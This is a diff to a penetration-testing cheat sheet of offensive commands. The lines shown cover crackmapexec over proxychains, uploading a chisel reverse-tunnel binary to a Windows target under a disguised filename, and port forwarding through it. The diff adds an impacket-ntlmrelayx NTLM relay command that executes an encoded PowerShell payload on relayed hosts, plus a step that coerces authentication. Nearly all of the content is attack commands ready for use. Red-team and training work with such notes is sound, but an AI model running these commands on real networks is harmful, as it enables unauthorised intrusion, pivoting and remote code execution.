@@ -70,10 +70,16 @@ proxychains -q crackmapexec smb 10.20.30.220-222 10.20.30.224 -u username -d tes
 ./chisel server -p 8888 --reverse
 sesssion -i 1
 upload /home/user/tools/chisel/chisel.exe c:\\Users\\targetuser\\definitely_not_chisel_here.exe
-#Then from the Windows host, by connection to chisel server on port 8888 and redirect the Windows host port 80 to 8008 on the host running chisel server: 
+#Then from the Windows host, connect to your host by connecting to chisel server on port 8888 and redirect the Windows host port 80 to 8008 on the host running chisel server: 
 definitely_not_chisel_here.exe client 192.168.12.34:8888 R:80:10.20.30.221:8008
 #If there was for example a httpd on port 80 on the Windows host, you could access it from the chisel server host through a browser: http://localhost:8008/
 #If there's any unreachable internal servers for the above you can just point those to 127.0.0.1 in your /etc/hosts to make them resolve and point to correct net.
+
+----
+
+#NTLM relay with impacket, with SMB2 and no httpd, where you can leverage https://github.com/LancreFI/shellScripts/blob/main/to_psb64.sh to create the <base64> powershell payload:
+sudo impacket-ntlmrelayx -smb2support --no-http-server -t 192.168.12.34 -c "powershell -enc <base64>"
+#Then you just make the target host do NTLM-auth using the IP of your host as the target: //192.168.12.34/testing (testing folder should not exsist).
 
 ----
 
